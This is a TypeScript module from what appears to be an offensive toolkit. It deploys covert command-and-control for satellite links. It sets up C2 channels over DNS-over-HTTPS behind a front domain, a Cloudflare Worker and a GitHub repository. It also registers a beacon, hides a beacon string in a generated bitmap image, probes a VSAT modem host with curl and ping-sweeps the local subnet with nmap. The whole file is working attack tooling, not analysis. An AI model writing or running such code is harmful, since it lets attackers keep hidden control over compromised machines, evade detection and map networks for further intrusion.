/**
 * @module ares/satellite_c2
 * Satellite covert C2 — CovertC2Engine + stego beacon + VSAT probe.
 */
import { CovertC2Engine } from "../covert_c2.ts"
import { generateC2Image } from "../stego_c2.ts"
import { LegitC2Server, InMemoryTransport } from "../c2_platform.ts"
import { brokerExec, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
import { c2Material, step, type ExecStep } from "./_integrations.ts"

export interface SatelliteC2Result {
  c2Id: string
  channels: string[]
  artifacts: string[]
  steps: ExecStep[]
  probed: boolean
  summary: string
}

export async function deploySatelliteC2(opts: {
  live?: boolean
  vsatHost?: string
  frontDomain?: string
}): Promise<SatelliteC2Result> {
  liveRequired("ares_satellite_c2", opts)
  const c2Id = `sat_${Date.now()}`
  const channels: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let probed = false

  const frontDomain = opts.frontDomain ?? "cdn.example.com"
  const { mailboxUrl, keyHex, session } = c2Material()

  const c2 = new CovertC2Engine()
  c2.dohChannel("sat_doh", frontDomain)
  c2.cloudflareWorker("sat_worker", "ourmine-sat")
  c2.githubChannel("sat_github", "org/sat-c2", 1)
  for (const [name] of c2.channels) channels.push(name)
  artifacts.push(writeArtifact("satellite", `${c2Id}_channels.json`, JSON.stringify([...c2.channels.values()], null, 2)))

  const server = new LegitC2Server({ checkpointPath: `.ourmine/ares/satellite/${c2Id}.jsonl` })
  server.registerBeacon(c2Id, new InMemoryTransport(), { host: frontDomain, user: session })
  steps.push(step("c2_mailbox", true, mailboxUrl))

  const bmp = generateC2Image(`SAT_BEACON:${session}`)
  artifacts.push(writeArtifact("satellite", `${c2Id}_stego.bmp`, bmp))
  steps.push(step("stego_beacon", bmp.length > 0, `${bmp.length} bytes`))

  if (opts.vsatHost && isToolAvailable("curl")) {
    const r = await brokerExec(`curl -sk -m 8 http://${opts.vsatHost}/ 2>&1 | head -c 500`)
    probed = r.ok
    writeArtifact("satellite", "vsat_probe.txt", r.out)
    steps.push(step("vsat_probe", r.ok, r.out.slice(0, 200)))
    channels.push("vsat_modem")
  }

  if (isToolAvailable("nmap")) {
    const r = await brokerExec("nmap -sn 192.168.1.0/24 2>&1 | head -30")
    steps.push(step("local_modem_scan", r.ok, r.out.slice(0, 200)))
  }

  return {
    c2Id,
    channels,
    artifacts,
    steps,
    probed,
    summary: `Satellite C2: ${channels.length} channel(s), probed=${probed}`,
  }
}

export default { deploySatelliteC2 }
